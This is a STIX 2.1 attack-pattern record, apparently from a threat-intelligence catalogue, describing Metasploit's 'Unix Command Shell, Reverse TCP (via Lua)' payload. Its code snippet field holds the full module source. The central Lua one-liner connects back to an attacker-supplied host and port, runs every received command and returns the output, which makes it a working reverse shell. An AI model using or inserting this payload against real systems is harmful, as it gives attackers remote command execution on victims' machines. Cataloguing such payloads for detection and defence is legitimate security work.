{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1d969e52-a383-4b14-90fd-cb65729a8640",
    "created": "2024-08-14T16:33:19.316161Z",
    "modified": "2024-08-14T16:33:19.316165Z",
    "name": "Unix Command Shell, Reverse TCP (via Lua)",
    "description": "Creates an interactive shell via Lua",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/reverse_lua.rb",
            "external_id": "reverse_lua.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 224\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Reverse TCP (via Lua)',\n     'Description'   => 'Creates an interactive shell via Lua',\n     'Author'        =>\n       [\n         'xistence <xistence[at]0x90.nl>',\n       ],\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::ReverseTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'RequiredCmd'   => 'lua',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('LuaPath', [true, 'The path to the Lua executable', 'lua'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    \"#{datastore['LuaPath']} -e \\\"local s=require('socket');local t=assert(s.tcp());t:connect('#{datastore['LHOST']}',#{datastore['LPORT']});while true do local r,x=t:receive();local f=assert(io.popen(r,'r'));local b=assert(f:read('*a'));t:send(b);end;f:close();t:close();\\\"\"\n  end\nend\n\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}